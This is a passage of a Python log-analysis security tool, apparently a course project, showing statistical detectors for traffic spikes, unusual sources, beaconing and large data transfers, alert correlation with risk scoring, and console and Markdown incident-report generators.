    statistics have a 50% breakdown point and do not.

    A bucket must clear both the statistical test and an absolute floor, which
    prevents a quiet log (median 1, MAD 0.5) from flagging every small ripple.
    """
    rule_id = "VOL-001"
    name = "Traffic volume spike"
    category = "volume"

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.buckets: Counter = Counter()
        self.bucket_events: Dict[int, List[Event]] = defaultdict(list)

    def feed(self, ev: Event) -> None:
        if ev.timestamp is None:
            return
        bucket = int(ev.timestamp.timestamp() // self.cfg.spike_bucket)
        self.buckets[bucket] += 1
        if len(self.bucket_events[bucket]) < 10:
            self.bucket_events[bucket].append(ev)

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        if len(self.buckets) < 5:
            return []                      # too little history for a baseline
        keys = sorted(self.buckets)
        # Fill empty buckets so quiet periods count toward the baseline
        series = [self.buckets.get(k, 0) for k in range(keys[0], keys[-1] + 1)]
        median, mad = median_abs_deviation([float(v) for v in series])
        if mad <= 0:
            mad = max(1.0, median * 0.1)   # degenerate case: near-constant traffic

        alerts: List[Alert] = []
        flagged: List[Tuple[int, int, float]] = []
        for bucket in keys:
            count = self.buckets[bucket]
            score = robust_zscore(count, median, mad)
            if score >= self.cfg.spike_sigma and count >= self.cfg.spike_min_events:
                flagged.append((bucket, count, score))
        if not flagged:
            return []

        flagged.sort(key=lambda t: -t[1])
        top = flagged[0]
        window_start = datetime.fromtimestamp(top[0] * self.cfg.spike_bucket)
        contributors: Counter = Counter()
        for bucket, _count, _score in flagged[:5]:
            for ev in self.bucket_events[bucket]:
                if ev.src_ip:
                    contributors[ev.src_ip] += 1
        peak_events = self.bucket_events[top[0]]
        alerts.append(Alert(
            rule_id="VOL-001",
            title="Traffic volume spike above statistical baseline",
            severity="HIGH" if top[2] >= self.cfg.spike_sigma * 2 else "MEDIUM",
            category=self.category,
            entity=f"{len(flagged)} interval(s)", entity_type="global",
            count=sum(c for _b, c, _s in flagged),
            threshold=(f"modified z-score >= {self.cfg.spike_sigma} and >= "
                       f"{self.cfg.spike_min_events} events per "
                       f"{self.cfg.spike_bucket}s bucket"),
            description=(
                f"{len(flagged)} time interval(s) exceeded the statistical baseline. The "
                f"largest carried {top[1]} events in {self.cfg.spike_bucket} seconds starting "
                f"{window_start.strftime('%Y-%m-%d %H:%M:%S')}, a modified z-score of "
                f"{top[2]:.1f} against a baseline median of {median:.1f} events per bucket "
                f"(MAD {mad:.2f}). Leading contributors: "
                + (", ".join(f"{ip} ({n})" for ip, n in contributors.most_common(5))
                   or "no source attribution available") + "."),
            recommendation=(
                "Determine whether the spike is legitimate demand (campaign, deployment, "
                "crawler) or hostile (DoS, mass scanning, exfiltration). Cross-reference the "
                "leading contributors against the other findings in this report before "
                "treating the volume as benign."),
            mitre="T1498 - Network Denial of Service",
            first_seen=window_start,
            last_seen=datetime.fromtimestamp((max(b for b, _c, _s in flagged) + 1)
                                             * self.cfg.spike_bucket),
            evidence=self.evidence_from(peak_events, self.cfg.max_evidence),
            related={
                "baseline_median_per_bucket": round(median, 2),
                "mad": round(mad, 2),
                "bucket_seconds": self.cfg.spike_bucket,
                "flagged_intervals": [
                    {"start": datetime.fromtimestamp(b * self.cfg.spike_bucket).isoformat(),
                     "events": c, "z_score": round(s, 2)} for b, c, s in flagged[:10]],
                "top_contributors": contributors.most_common(10),
            },
        ))
        return alerts


class UnusualSourceDetector(Detector):
    """
    VOL-002/003 - source-address anomalies.

    Three complementary notions of "unusual" are implemented, because in
    practice analysts mean different things by the phrase:
      * volumetric outlier - a source far above the per-source median
      * low-and-slow rare source - few requests, but almost all errors
      * previously unseen source - absent from an operator-supplied baseline
    """
    rule_id = "VOL-002"
    name = "Unusual source address"
    category = "volume"

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.counts: Counter = Counter()
        self.errors: Counter = Counter()
        self.samples: Dict[str, List[Event]] = defaultdict(list)
        self.first_seen: Dict[str, datetime] = {}
        self.last_seen: Dict[str, datetime] = {}
        self.kinds: Dict[str, str] = {}

    def feed(self, ev: Event) -> None:
        ip = ev.src_ip
        if not ip or self.cfg.is_allowed_ip(ip):
            return
        self.counts[ip] += 1
        self.kinds[ip] = ev.src_kind
        if ev.outcome == "failure" or (ev.status and ev.status >= 400):
            self.errors[ip] += 1
        if len(self.samples[ip]) < 6:
            self.samples[ip].append(ev)
        if ev.timestamp:
            self.first_seen.setdefault(ip, ev.timestamp)
            self.last_seen[ip] = ev.timestamp

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        if not self.counts:
            return []
        alerts: List[Alert] = []
        cfg = self.cfg
        values = [float(v) for v in self.counts.values()]
        median, mad = median_abs_deviation(values)
        if mad <= 0:
            mad = max(1.0, median * 0.25)
        total = sum(values)

        # -- volumetric outliers ---------------------------------------------
        outliers = []
        for ip, count in self.counts.items():
            score = robust_zscore(float(count), median, mad)
            if score >= cfg.ip_volume_sigma and count >= cfg.ip_volume_min:
                outliers.append((ip, count, score))
        outliers.sort(key=lambda t: -t[1])
        for ip, count, score in outliers[: cfg.top_n]:
            share = pct(count, total)
            alerts.append(Alert(
                rule_id="VOL-002",
                title="Source volume far above baseline",
                severity="MEDIUM" if score < cfg.ip_volume_sigma * 2 else "HIGH",
                category=self.category,
                entity=ip, entity_type="ip", count=count,
                threshold=(f"modified z-score >= {cfg.ip_volume_sigma} and >= "
                           f"{cfg.ip_volume_min} events"),
                description=(
                    f"Source {ip} ({self.kinds.get(ip, 'unknown')}) accounts for {count} events "
                    f"({share:.1f}% of all attributed activity), a modified z-score of "
                    f"{score:.1f} against a per-source median of {median:.1f}. A single "
                    f"address dominating traffic is either infrastructure (proxy, NAT gateway, "
                    f"monitor) or an automated client."),
                recommendation=("Identify the source. If it is a known proxy or health check, "
                                "add it to the allow-list so future runs are quieter; "
                                "otherwise investigate what it is doing."),
                mitre="T1595 - Active Scanning",
                first_seen=self.first_seen.get(ip), last_seen=self.last_seen.get(ip),
                evidence=self.evidence_from(self.samples[ip], cfg.max_evidence),
                related={"share_percent": round(share, 2), "z_score": round(score, 2)},
            ))

        # -- rare but almost entirely failing sources -------------------------
        rare = []
        for ip, count in self.counts.items():
            if count < cfg.rare_ip_min_events or count >= median * 2:
                continue
            ratio = self.errors[ip] / count if count else 0.0
            if ratio >= cfg.rare_ip_error_ratio:
                rare.append((ip, count, ratio))
        rare.sort(key=lambda t: (-t[2], -t[1]))
        for ip, count, ratio in rare[: cfg.top_n]:
            alerts.append(Alert(
                rule_id="VOL-003",
                title="Rare source with near-total failure rate",
                severity="MEDIUM",
                category=self.category,
                entity=ip, entity_type="ip", count=count,
                threshold=(f">= {cfg.rare_ip_min_events} events with >= "
                           f"{int(cfg.rare_ip_error_ratio * 100)}% failures, below the "
                           f"per-source volume median"),
                description=(
                    f"Source {ip} produced only {count} events but {ratio * 100:.0f}% of them "
                    f"failed. Low volume keeps a source under rate-based thresholds, while a "
                    f"failure rate this high is inconsistent with a legitimate client that "
                    f"knows what it is asking for - the classic low-and-slow profile."),
                recommendation=("Review the specific requests. Low-volume sources are often "
                                "excluded from monitoring precisely because they are quiet, "
                                "which is why attackers use the pattern."),
                mitre="T1595 - Active Scanning",
                first_seen=self.first_seen.get(ip), last_seen=self.last_seen.get(ip),
                evidence=self.evidence_from(self.samples[ip], cfg.max_evidence),
                related={"failure_ratio": round(ratio, 3)},
            ))

        # -- sources absent from an operator-supplied baseline -----------------
        if cfg.baseline_ips:
            unknown = [(ip, c) for ip, c in self.counts.items()
                       if ip not in cfg.baseline_ips and c >= cfg.rare_ip_min_events]
            unknown.sort(key=lambda t: -t[1])
            for ip, count in unknown[: cfg.top_n]:
                alerts.append(Alert(
                    rule_id="VOL-004",
                    title="Source not present in known-good baseline",
                    severity="LOW",
                    category=self.category,
                    entity=ip, entity_type="ip", count=count,
                    threshold=f"absent from baseline of {len(cfg.baseline_ips)} known addresses",
                    description=(
                        f"Source {ip} generated {count} events and does not appear in the "
                        f"supplied baseline. New sources are expected on public services but "
                        f"are strong signals on internal ones."),
                    recommendation="Confirm the source is expected for this asset.",
                    mitre="T1078 - Valid Accounts",
                    first_seen=self.first_seen.get(ip), last_seen=self.last_seen.get(ip),
                    evidence=self.evidence_from(self.samples[ip], cfg.max_evidence),
                ))
        return alerts


class BeaconDetector(Detector):
    """
    VOL-005 - near-constant inter-arrival timing from a single source.

    Human and application traffic is bursty and irregular.  Malware calling
    home on a timer is not: its inter-arrival deltas cluster tightly around a
    fixed interval.  The test is the coefficient of variation of the deltas
    (stdev / median); values below ~0.15 indicate machine-timed activity.
    """
    rule_id = "VOL-005"
    name = "Periodic beaconing"
    category = "volume"

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.timeline: Dict[str, List[float]] = defaultdict(list)
        self.samples: Dict[str, List[Event]] = defaultdict(list)
        self.uris: Dict[str, Counter] = defaultdict(Counter)

    def feed(self, ev: Event) -> None:
        if ev.timestamp is None or not ev.src_ip or self.cfg.is_allowed_ip(ev.src_ip):
            return
        self.timeline[ev.src_ip].append(ev.timestamp.timestamp())
        if len(self.samples[ev.src_ip]) < 6:
            self.samples[ev.src_ip].append(ev)
        if ev.uri:
            self.uris[ev.src_ip][ev.uri.split("?")[0][:120]] += 1

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        alerts: List[Alert] = []
        cfg = self.cfg
        for ip, stamps in self.timeline.items():
            if len(stamps) < cfg.beacon_min_events:
                continue
            stamps.sort()
            deltas = [b - a for a, b in zip(stamps, stamps[1:]) if b - a > 0]
            if len(deltas) < cfg.beacon_min_events - 1:
                continue
            median_delta = statistics.median(deltas)
            if median_delta < cfg.beacon_min_interval:
                continue                        # too fast to be a beacon; that is a flood
            try:
                spread = statistics.pstdev(deltas)
            except statistics.StatisticsError:
                continue
            jitter = spread / median_delta if median_delta else 1.0
            if jitter > cfg.beacon_max_jitter:
                continue
            top_uri = self.uris[ip].most_common(1)
            alerts.append(Alert(
                rule_id="VOL-005",
                title="Periodic beaconing pattern (possible C2 channel)",
                severity="HIGH",
                category=self.category,
                entity=ip, entity_type="ip", count=len(stamps),
                threshold=(f">= {cfg.beacon_min_events} events with timing jitter <= "
                           f"{cfg.beacon_max_jitter:.2f}"),
                description=(
                    f"Source {ip} generated {len(stamps)} events at a near-constant interval "
                    f"of {median_delta:.1f} seconds (jitter {jitter:.3f}, i.e. the deviation "
                    f"is only {jitter * 100:.1f}% of the interval). Regularity this tight is "
                    f"produced by a scheduler, not by a person"
                    + (f"; the dominant target was {top_uri[0][0]}." if top_uri else ".")),
                recommendation=(
                    "Distinguish benign automation (monitoring probes, cron-driven API polling, "
                    "software update checks) from malicious beaconing by identifying the "
                    "process on the host. If the source is unmanaged, treat it as a suspected "
                    "command-and-control channel."),
                mitre="T1071.001 - Application Layer Protocol: Web Protocols",
                first_seen=datetime.fromtimestamp(stamps[0]),
                last_seen=datetime.fromtimestamp(stamps[-1]),
                evidence=self.evidence_from(self.samples[ip], cfg.max_evidence),
                related={"interval_seconds": round(median_delta, 2),
                         "jitter": round(jitter, 4),
                         "event_count": len(stamps)},
            ))
        return alerts


class DataTransferDetector(Detector):
    """
    EXF-001/002 - response-size thresholds indicating possible data theft.

    Two thresholds are needed because exfiltration takes two shapes: one very
    large download (a database dump) and many ordinary downloads that add up
    (chunked staging designed to look normal).
    """
    rule_id = "EXF-001"
    name = "Large data transfer"
    category = "exfiltration"

    def __init__(self, cfg: Config) -> None:
        super().__init__(cfg)
        self.large: List[Event] = []
        self.totals: Counter = Counter()
        self.samples: Dict[str, List[Event]] = defaultdict(list)
        self.first: Dict[str, datetime] = {}
        self.last: Dict[str, datetime] = {}

    def feed(self, ev: Event) -> None:
        if not ev.size or ev.category != "web":
            return
        ip = ev.src_ip or "unknown"
        if self.cfg.is_allowed_ip(ip):
            return
        self.totals[ip] += ev.size
        if ev.timestamp:
            self.first.setdefault(ip, ev.timestamp)
            self.last[ip] = ev.timestamp
        if ev.size >= self.cfg.exfil_single_bytes:
            self.large.append(ev)
        if len(self.samples[ip]) < 6 and ev.size > 0:
            self.samples[ip].append(ev)

    def finalize(self, ctx: AnalysisContext) -> List[Alert]:
        alerts: List[Alert] = []
        if self.large:
            by_ip: Dict[str, List[Event]] = defaultdict(list)
            for ev in self.large:
                by_ip[ev.src_ip or "unknown"].append(ev)
            for ip, events in by_ip.items():
                biggest = max(events, key=lambda e: e.size or 0)
                alerts.append(Alert(
                    rule_id="EXF-001",
                    title="Unusually large single response",
                    severity="HIGH",
                    category=self.category,
                    entity=ip, entity_type="ip", count=len(events),
                    threshold=f"single response >= {human_bytes(self.cfg.exfil_single_bytes)}",
                    description=(
                        f"Source {ip} received {len(events)} response(s) at or above "
                        f"{human_bytes(self.cfg.exfil_single_bytes)}; the largest was "
                        f"{human_bytes(biggest.size)} for {truncate(biggest.uri or '?', 120)}. "
                        f"Outsized responses on an endpoint that normally returns small "
                        f"payloads are a hallmark of bulk data retrieval."),
                    recommendation=("Confirm the endpoint is meant to return data of this size "
                                    "and that the requester was authorized. Consider adding "
                                    "response-size limits and pagination."),
                    mitre="T1041 - Exfiltration Over C2 Channel",
                    first_seen=min((e.timestamp for e in events if e.timestamp), default=None),
                    last_seen=max((e.timestamp for e in events if e.timestamp), default=None),
                    evidence=self.evidence_from(events, self.cfg.max_evidence),
                    related={"largest_bytes": biggest.size, "uri": biggest.uri},
                ))

        for ip, total in self.totals.items():
            if total < self.cfg.exfil_total_bytes:
                continue
            alerts.append(Alert(
                rule_id="EXF-002",
                title="High cumulative outbound volume to a single source",
                severity="MEDIUM",
                category=self.category,
                entity=ip, entity_type="ip", count=int(total),
                threshold=f"cumulative >= {human_bytes(self.cfg.exfil_total_bytes)}",
                description=(
                    f"Source {ip} received {human_bytes(int(total))} in aggregate. Staging "
                    f"data in many normal-sized responses is a deliberate technique for "
                    f"staying under single-transfer alarms, so cumulative volume is measured "
                    f"separately."),
                recommendation=("Compare against this source's historical norm and the "
                                "sensitivity of the endpoints it accessed."),
                mitre="T1030 - Data Transfer Size Limits",
                first_seen=self.first.get(ip), last_seen=self.last.get(ip),
                evidence=self.evidence_from(self.samples[ip], self.cfg.max_evidence),
                related={"total_bytes": int(total)},
            ))
        return alerts


DETECTOR_CLASSES: List[type] = [
    BruteForceDetector,
    CompromiseDetector,
    PrivilegeDetector,
    SudoAbuseDetector,
    OffHoursDetector,
    WebAttackDetector,
    ScanningDetector,
    TrafficSpikeDetector,
    UnusualSourceDetector,
    BeaconDetector,
    DataTransferDetector,
]


# ===========================================================================
# SECTION 15 - ANALYSIS ENGINE (pipeline stages 6-7)
# ===========================================================================
@dataclass
class AnalysisResult:
    """Everything the reporters need, assembled once."""
    alerts: List[Alert]
    context: AnalysisContext
    risk_score: float
    risk_label: str
    severity_counts: Counter
    iocs: Dict[str, List[Tuple[str, int]]]
    timeline: List[Tuple[datetime, int]]
    duration_seconds: float
    input_files: List[str]


class AnalysisEngine:
    """
    Runs every detector over the event stream in a single chronological pass,
    then correlates the results into a prioritized finding set.
    """

    def __init__(self, cfg: Config) -> None:
        self.cfg = cfg
        self.detectors: List[Detector] = [cls(cfg) for cls in DETECTOR_CLASSES]

    # ---------------------------------------------------------------
    def run(self, events: List[Event], stats: ParseStats,
            input_files: Sequence[str]) -> AnalysisResult:
        started = datetime.now()
        ctx = AnalysisContext(cfg=self.cfg, events=events, stats=stats)

        # -- single pass: statistics + every detector --------------------
        for ev in events:
            self._accumulate(ctx, ev)
            for detector in self.detectors:
                try:
                    detector.feed(ev)
                except Exception as exc:                      # a bad line must not
                    debug(f"{detector.rule_id} feed error at {ev.location()}: {exc}")

        timestamps = [e.timestamp for e in events if e.timestamp]
        ctx.start_time = min(timestamps) if timestamps else None
        ctx.end_time = max(timestamps) if timestamps else None

        # -- collect alerts ----------------------------------------------
        alerts: List[Alert] = []
        for detector in self.detectors:
            try:
                alerts.extend(detector.finalize(ctx))
            except Exception as exc:                          # kill one rule, not the run
                error(f"detector {detector.rule_id} failed during finalize: {exc}")

        alerts = self._correlate(alerts)
        alerts.sort(key=lambda a: (-a.rank, -a.count, a.rule_id))

        severity_counts = Counter(a.severity for a in alerts)
        risk_score, risk_label = self._risk_score(alerts, ctx)
        result = AnalysisResult(
            alerts=alerts,
            context=ctx,
            risk_score=risk_score,
            risk_label=risk_label,
            severity_counts=severity_counts,
            iocs=self._extract_iocs(alerts, ctx),
            timeline=self._build_timeline(ctx),
            duration_seconds=(datetime.now() - started).total_seconds(),
            input_files=list(input_files),
        )
        return result

    # ---------------------------------------------------------------
    @staticmethod
    def _accumulate(ctx: AnalysisContext, ev: Event) -> None:
        ctx.category_counter[ev.category] += 1
        if ev.src_ip:
            ctx.ip_counter[ev.src_ip] += 1
            if ev.timestamp:
                ctx.ip_first_seen.setdefault(ev.src_ip, ev.timestamp)
                ctx.ip_timeline[ev.src_ip].append(ev.timestamp.timestamp())
            if ev.outcome == "failure" or (ev.status and ev.status >= 400):
                ctx.ip_error_counter[ev.src_ip] += 1
            if ev.size:
                ctx.ip_bytes[ev.src_ip] += ev.size
        if ev.user:
            ctx.user_counter[ev.user] += 1
        if ev.status:
            ctx.status_counter[ev.status] += 1
        if ev.timestamp:
            ctx.hour_histogram[ev.timestamp.replace(minute=0, second=0, microsecond=0)] += 1

    # ---------------------------------------------------------------
    def _correlate(self, alerts: List[Alert]) -> List[Alert]:
        """
        Cross-rule correlation.

        A finding is more serious when the same entity appears in several
        independent rules: an IP that is brute-forcing *and* scanning *and*
        sending SQL injection is not three coincidences, it is one campaign.
        Entities appearing in three or more distinct rules are escalated one
        severity level and annotated.
        """
        by_entity: Dict[str, Set[str]] = defaultdict(set)
        for alert in alerts:
            if alert.entity_type in ("ip", "user"):
                by_entity[f"{alert.entity_type}:{alert.entity}"].add(alert.rule_id)

        multi = {key: rules for key, rules in by_entity.items() if len(rules) >= 3}
        for alert in alerts:
            key = f"{alert.entity_type}:{alert.entity}"
            if key not in multi:
                continue
            rules = sorted(multi[key])
            alert.related["correlated_rules"] = rules
            alert.description += (
                f" CORRELATION: this entity independently triggered {len(rules)} distinct "
                f"detection rules ({', '.join(rules)}), which substantially raises confidence "
                f"that the activity is a coordinated attack rather than noise.")
            if alert.rank < SEVERITY_RANK["CRITICAL"]:
                alert.severity = SEVERITIES[alert.rank + 1]
        return alerts

    # ---------------------------------------------------------------
    @staticmethod
    def _risk_score(alerts: List[Alert], ctx: AnalysisContext) -> Tuple[float, str]:
        """
        Aggregate risk on a 0-100 scale.

        Raw severity weights are summed and then passed through a saturating
        curve so that a hundred medium findings cannot outrank one confirmed
        compromise, and so that the score stays interpretable rather than
        growing without bound on a large log.
        """
        raw = sum(SEVERITY_WEIGHT.get(a.severity, 0.0) for a in alerts)
        # Confirmed-compromise rules carry an explicit floor.
        floor = 0.0
        for alert in alerts:
            if alert.rule_id in ("AUTH-005", "PRIV-004"):
                floor = max(floor, 85.0)
            elif alert.severity == "CRITICAL":
                floor = max(floor, 70.0)
        score = 100.0 * (1.0 - math.exp(-raw / 45.0))
        score = max(score, floor)
        score = min(100.0, round(score, 1))
        if score >= 85:
            label = "CRITICAL"
        elif score >= 65:
            label = "HIGH"
        elif score >= 35:
            label = "MODERATE"
        elif score > 0:
            label = "LOW"
        else:
            label = "MINIMAL"
        return score, label

    # ---------------------------------------------------------------
    @staticmethod
    def _extract_iocs(alerts: List[Alert],
                      ctx: AnalysisContext) -> Dict[str, List[Tuple[str, int]]]:
        """Pull out the atomic indicators an analyst would push to a blocklist."""
        ips: Counter = Counter()
        users: Counter = Counter()
        uris: Counter = Counter()
        agents: Counter = Counter()
        for alert in alerts:
            weight = max(1, alert.rank)
            if alert.entity_type == "ip" and alert.entity not in ("unknown", ""):
                ips[alert.entity] += weight
            if alert.entity_type == "user":
                users[alert.entity] += weight
            for ip in alert.related.get("source_ips", []) or []:
                ips[ip] += 1
            for account in alert.related.get("accounts", []) or []:
                if isinstance(account, str):
                    users[account] += 1
            for uri in alert.related.get("sample_uris", []) or []:
                uris[uri] += weight
            for path in alert.related.get("sample_paths", []) or []:
                uris[path] += 1
            agent = alert.related.get("user_agent")
            if agent:
                agents[truncate(str(agent), 120)] += weight
        return {
            "ip_addresses": ips.most_common(30),
            "accounts": users.most_common(30),
            "uris": uris.most_common(30),
            "user_agents": agents.most_common(15),
        }

    # ---------------------------------------------------------------
    @staticmethod
    def _build_timeline(ctx: AnalysisContext) -> List[Tuple[datetime, int]]:
        if not ctx.hour_histogram:
            return []
        keys = sorted(ctx.hour_histogram)
        filled: List[Tuple[datetime, int]] = []
        cursor = keys[0]
        end = keys[-1]
        guard = 0
        while cursor <= end and guard < 5000:
            filled.append((cursor, ctx.hour_histogram.get(cursor, 0)))
            cursor += timedelta(hours=1)
            guard += 1
        return filled


# ===========================================================================
# SECTION 16 - REPORTING (pipeline stage 8)
# ===========================================================================
EXEC_NARRATIVE = {
    "CRITICAL": ("Evidence of active compromise or attacker success is present in these "
                 "logs. Incident response should begin immediately."),
    "HIGH": ("Sustained hostile activity is present. Containment actions should be taken "
             "within the current shift."),
    "MODERATE": ("Reconnaissance and probing activity is present. No confirmed compromise, "
                 "but the environment is under active attention."),
    "LOW": ("Minor anomalies were observed. Routine review is sufficient."),
    "MINIMAL": ("No activity crossed a detection threshold in the analyzed period."),
}


def severity_bar(counts: Counter, width: int = 40) -> str:
    total = sum(counts.values()) or 1
    out = []
    for sev in reversed(SEVERITIES):
        n = counts.get(sev, 0)
        if n:
            out.append(f"{SEVERITY_COLOR[sev]}{'#' * max(1, int(width * n / total))}{C.RESET}")
    return "".join(out)


class ConsoleReporter:
    """Human-readable summary printed at the end of an interactive run."""

    def __init__(self, result: AnalysisResult, cfg: Config, min_severity: str = "INFO") -> None:
        self.r = result
        self.cfg = cfg
        self.min_rank = SEVERITY_RANK.get(min_severity, 0)

    def render(self) -> None:
        r = self.r
        ctx = r.context
        print()
        print(banner(hr("=")))
        print(banner(f" {TOOL_NAME} v{TOOL_VERSION} - SECURITY ANALYSIS REPORT"))
        print(banner(hr("=")))
        print(f" Generated    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f" Sources      : {ctx.stats.files} file(s), "
              f"{ctx.stats.total_lines:,} line(s)")
        span = "unknown"
        if ctx.start_time and ctx.end_time:
            span = (f"{ctx.start_time.strftime('%Y-%m-%d %H:%M:%S')} -> "
                    f"{ctx.end_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f" Log period   : {span}")
        print(f" Events       : {len(ctx.events):,} normalized "
              f"({ctx.stats.parse_rate:.1f}% of non-blank lines parsed cleanly)")
        print(f" Analysis time: {r.duration_seconds:.2f}s")
        print()

        color = {"CRITICAL": C.BRED, "HIGH": C.RED, "MODERATE": C.YELLOW,
                 "LOW": C.CYAN, "MINIMAL": C.GREEN}.get(r.risk_label, "")
        print(f" {C.BOLD}OVERALL RISK{C.RESET} : {color}{C.BOLD}{r.risk_score:.1f}/100 "
              f"({r.risk_label}){C.RESET}")
        print(f" {textwrap_fill(EXEC_NARRATIVE.get(r.risk_label, ''), 74, ' ' * 15)}")
        print()
        if r.alerts:
            print(f" Findings     : {len(r.alerts)}  {severity_bar(r.severity_counts)}")
            parts = [f"{SEVERITY_COLOR[s]}{s}={r.severity_counts.get(s, 0)}{C.RESET}"
                     for s in reversed(SEVERITIES) if r.severity_counts.get(s)]
            print(f"                {'  '.join(parts)}")
        else:
            print(f" Findings     : {C.GREEN}none above threshold{C.RESET}")
        print()

        shown = [a for a in r.alerts if a.rank >= self.min_rank]
        if shown:
            print(banner(hr("-")))
            print(banner(" DETAILED FINDINGS"))
            print(banner(hr("-")))
        for idx, alert in enumerate(shown, start=1):
            sev_color = SEVERITY_COLOR[alert.severity]
            print(f"\n {C.BOLD}[{idx:02d}]{C.RESET} {sev_color}{C.BOLD}"
                  f"{alert.severity:<8}{C.RESET} {alert.rule_id}  {alert.title}")
            print(f"      Entity     : {alert.entity}  ({alert.entity_type})")
            print(f"      Observed   : {alert.count} | window: {alert.window_text()}")
            print(f"      Threshold  : {alert.threshold}")
            if alert.mitre:
                print(f"      ATT&CK     : {alert.mitre}")
            print(textwrap_fill(alert.description, 70, "      "))
            print(f"      {C.CYAN}Action{C.RESET}     :")
            print(textwrap_fill(alert.recommendation, 70, "      "))
            if alert.evidence:
                print(f"      {C.DIM}Evidence:{C.RESET}")
                for line in alert.evidence[: self.cfg.max_evidence]:
                    print(f"        {C.DIM}{truncate(line, 150)}{C.RESET}")

        print()
        print(banner(hr("-")))
        print(banner(" TOP INDICATORS"))
        print(banner(hr("-")))
        for label, key in (("IP addresses", "ip_addresses"), ("Accounts", "accounts")):
            items = r.iocs.get(key, [])[:8]
            if items:
                print(f" {label:<14}: " + ", ".join(f"{v}" for v, _w in items))
        if ctx.ip_counter:
            print(f" Top talkers   : " + ", ".join(
                f"{ip}({n})" for ip, n in ctx.ip_counter.most_common(6)))
        if ctx.status_counter:
            print(f" HTTP statuses : " + ", ".join(
                f"{code}={n}" for code, n in sorted(ctx.status_counter.items())[:10]))
        if r.timeline:
            counts = [c for _t, c in r.timeline]
            print(f"\n Activity      : |{sparkline(counts)}|  peak {max(counts)}/hour")
            print(f"                 {r.timeline[0][0].strftime('%m-%d %H:%M')}"
                  f"{' ' * 34}{r.timeline[-1][0].strftime('%m-%d %H:%M')}")
        print()
        print(banner(hr("=")))


def textwrap_fill(text: str, width: int, indent: str) -> str:
    """Wrap a paragraph to width, prefixing every line with indent."""
    import textwrap as _tw
    return "\n".join(indent + line for line in _tw.wrap(text, width=width)) or (indent + text)


class MarkdownReporter:
    """
    Produces the formal deliverable: a structured written security report.

    The layout follows standard incident-report practice - executive summary
    first for a reader who will only read one page, then prioritized findings
    with evidence, then indicators, then methodology so the analysis can be
    reproduced or challenged.
    """

    def __init__(self, result: AnalysisResult, cfg: Config, analyst: str = "") -> None:
        self.r = result
        self.cfg = cfg
        self.analyst = analyst or os.environ.get("USERNAME") or os.environ.get("USER") or "analyst"

    def render(self) -> str:
        r = self.r
        ctx = r.context
        out: List[str] = []
        add = out.append

        # ---- header ----------------------------------------------------
        add(f"# Security Analysis Report")
        add("")
        add(f"**Generated by:** {TOOL_NAME} v{TOOL_VERSION}  ")
        add(f"**Course:** {COURSE}  ")
        add(f"**Analyst:** {self.analyst}  ")
        add(f"**Report date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}  ")
        add(f"**Classification:** Internal Use Only")
        add("")
        add("---")
        add("")

        # ---- executive summary -----------------------------------------
        add("## 1. Executive Summary")
        add("")
        add(f"| | |")
        add(f"|---|---|")
        add(f"| **Overall risk score** | **{r.risk_score:.1f} / 100 - {r.risk_label}** |")
        add(f"| Total findings | {len(r.alerts)} |")
        for sev in reversed(SEVERITIES):
            if r.severity_counts.get(sev):
                add(f"| {sev} findings | {r.severity_counts[sev]} |")
        add(f"| Log sources analyzed | {ctx.stats.files} |")
        add(f"| Lines read | {ctx.stats.total_lines:,} |")
        add(f"| Events normalized | {len(ctx.events):,} |")
        add(f"| Parse success rate | {ctx.stats.parse_rate:.1f}% |")
        if ctx.start_time and ctx.end_time:
            add(f"| Log period covered | {ctx.start_time.strftime('%Y-%m-%d %H:%M:%S')} to "
                f"{ctx.end_time.strftime('%Y-%m-%d %H:%M:%S')} |")
        add(f"| Analysis runtime | {r.duration_seconds:.2f}s |")
        add("")
        add(EXEC_NARRATIVE.get(r.risk_label, ""))
        add("")

        if r.alerts:
            add("### Priority actions")
            add("")
            ranked = [a for a in r.alerts if a.rank >= SEVERITY_RANK["HIGH"]][:5]
            if not ranked:
                ranked = r.alerts[:3]
            for idx, alert in enumerate(ranked, start=1):
                add(f"{idx}. **[{alert.severity}] {alert.title}** - `{alert.entity}`. "
                    f"{alert.recommendation}")
            add("")

        # ---- findings summary table -------------------------------------
        add("## 2. Findings Summary")
        add("")
        if not r.alerts:
            add("No activity in the analyzed logs crossed a configured detection threshold.")
            add("")
        else:
            add("| # | Severity | Rule | Finding | Entity | Count | Window |")
            add("|---|----------|------|---------|--------|-------|--------|")
            for idx, alert in enumerate(r.alerts, start=1):
                add(f"| {idx} | **{alert.severity}** | `{alert.rule_id}` | {alert.title} "
                    f"| `{alert.entity}` | {alert.count} | {alert.window_text()} |")
            add("")

        # ---- detailed findings ------------------------------------------
        if r.alerts:
            add("## 3. Detailed Findings")
            add("")
            for idx, alert in enumerate(r.alerts, start=1):
                add(f"### 3.{idx} [{alert.severity}] {alert.title}")
                add("")
                add(f"- **Rule ID:** `{alert.rule_id}`")
                add(f"- **Category:** {alert.category}")
                add(f"- **Affected entity:** `{alert.entity}` ({alert.entity_type})")
                add(f"- **Observations:** {alert.count}")
                add(f"- **Threshold exceeded:** {alert.threshold}")
                add(f"- **Time window:** {alert.window_text()}")
                if alert.mitre:
                    add(f"- **MITRE ATT&CK:** {alert.mitre}")
                add("")
                add("**Analysis**")
                add("")
                add(alert.description)
                add("")
                add("**Recommended action**")
                add("")
                add(alert.recommendation)
                add("")
                if alert.evidence:
                    add("**Supporting evidence**")
                    add("")
                    add("```")
                    for line in alert.evidence:
                        add(truncate(line, 220))
                    add("```")
                    add("")
                extras = {k: v for k, v in alert.related.items() if v not in (None, [], {}, "")}
                if extras:
                    add("<details><summary>Additional context</summary>")
                    add("")
                    add("```json")
                    add(json.dumps(extras, indent=2, default=str)[:2000])
                    add("```")
                    add("")
                    add("</details>")
                    add("")

        # ---- IOCs --------------------------------------------------------
        add("## 4. Indicators of Compromise")
        add("")
        any_ioc = False
        for label, key in (("Source IP addresses", "ip_addresses"),
                           ("Accounts referenced", "accounts"),
                           ("URIs / paths of interest", "uris"),
                           ("User agents", "user_agents")):
            items = r.iocs.get(key, [])
            if not items:
                continue
            any_ioc = True
